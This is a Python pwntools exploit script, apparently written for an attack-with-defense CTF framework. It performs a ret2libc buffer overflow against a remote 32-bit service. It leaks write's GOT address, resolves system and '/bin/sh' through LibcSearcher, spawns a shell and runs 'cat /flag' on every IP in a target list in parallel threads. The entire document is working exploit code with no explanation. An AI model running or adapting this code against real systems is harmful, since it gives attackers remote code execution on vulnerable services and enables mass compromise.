from awdframework.awd import Attack,AwdTask
from os.path import dirname
import pwn
from LibcSearcher import LibcSearcher

class Exp(AwdTask):
    def __init__(self, ips, port=80):
        super().__init__(ips, port)

    def exp(self, ip):
        sh = pwn.remote(ip, self.port)
        pwn.context.arch = "i386"
        payload = pwn.flat(chr(0) * (0x2c - 0x25), 0x80)
        sh.sendline(payload)
        e = pwn.ELF("/home/inhann/ctf")
        write_got = e.got["write"]
        write_plt = e.plt["write"]
        # main_addr = e.symbols["main"]
        main_addr = 0x08048825

        payload = pwn.flat(chr(0) * (0xe7 + 4), write_plt, main_addr, 1, write_got, 4)
        sh.sendline(payload)
        sh.recvuntil("Correct\n")
        write_addr = pwn.u32(sh.recv(4))
        libc = LibcSearcher("write", write_addr)
        libc_base = write_addr - libc.dump("write")
        system_addr = libc_base + libc.dump("system")
        bin_sh_addr = libc_base + libc.dump("str_bin_sh")

        payload = pwn.flat(chr(0) * (0x2c - 0x25), 0x80)
        sh.sendline(payload)

        payload = pwn.flat(chr(0) * (0xe7 + 4), system_addr, 0xdeadbeef, bin_sh_addr)
        sh.recvuntil("Correct\n")
        sh.sendline(payload)

        # 本来是 interactive，现在直接执行命令
        # sh.interactive()
        sh.sendline(b"cat /flag")
        result = sh.recv()
        print(result)


attacker = Attack(f"{dirname(__file__)}\..\..\ip.txt",Exp,port=27782,thread_num=5)
attacker.attack()